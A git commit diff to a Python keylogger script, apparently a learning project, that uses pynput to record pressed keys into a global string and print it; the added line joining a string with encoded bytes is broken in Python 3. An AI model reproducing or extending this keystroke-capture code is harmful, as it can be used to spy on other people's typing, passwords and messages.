00b844349f591f2e41f0ce509d4c30a898849eb8
NdunguAustine <ndunguaus@gmail.com>
2024-02-21 15:34:39 +0300

    handling errors

--- my_key_logger.py
+++ my_key_logger.py
@@ -1,12 +1,22 @@
 import pynput.keyboard
 
-
 # creating a listener object and a call back function
+
+log = ""
 
 
 # within the callback function, the on press method will forward the keys that are being pressed
 def callback_function(key):
-    print(key)
+    global log
+    try:
+        log = log + key.char.encode("utf-8")
+        # log = log + str(key)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + str(key)
+    print(log)
 
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
